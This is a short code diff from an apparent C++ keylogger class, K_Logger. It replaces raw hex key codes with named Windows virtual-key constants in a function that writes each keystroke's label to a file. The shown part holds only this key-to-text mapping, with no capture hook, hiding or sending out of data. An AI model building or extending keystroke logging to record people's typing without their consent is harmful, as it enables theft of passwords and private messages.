@@ -667,23 +667,23 @@ int K_Logger::SaveSymbol(WORD iKey)
 
 
 
-		case 0x5B:
+		case VK_LWIN:
 			std::cout << "Left_Win";
 			WriteToFile("Left_Win");
 			break;
 
 
-		case 0x20:
+		case VK_SPACE:
 			std::cout << " ";
 			WriteToFile(" ");
 			break;
 
-		case 0x09:
+		case VK_TAB:
 			std::cout << " *TAB* ";
 			WriteToFile(" *TAB* ");
 			break;
 
-		case 0x04:
+		case VK_MBUTTON:
 			std::cout << "  *mouse_middle-button*  ";
 			WriteToFile("  *mouse_middle-button*  ");
 			break;
@@ -693,17 +693,17 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile("  *Left_ALT*  ");
 			break;
 
-		case 0x2c:
+		case VK_SNAPSHOT:
 			std::cout << "  *PRINT_SCREEN*  ";
 			WriteToFile("  *PRINT_SCREEN*  ");
 			break;
 
-		case 0x14:
+		case VK_CAPITAL:
 			std::cout << "  *CAPS_LOCK*  ";
 			WriteToFile("  *CAPS_LOCK*  ");
 			break;
 
-		case 0x0D:
+		case VK_RETURN:
 			std::cout << "\n";
 			WriteToFile("\n");
 			break;
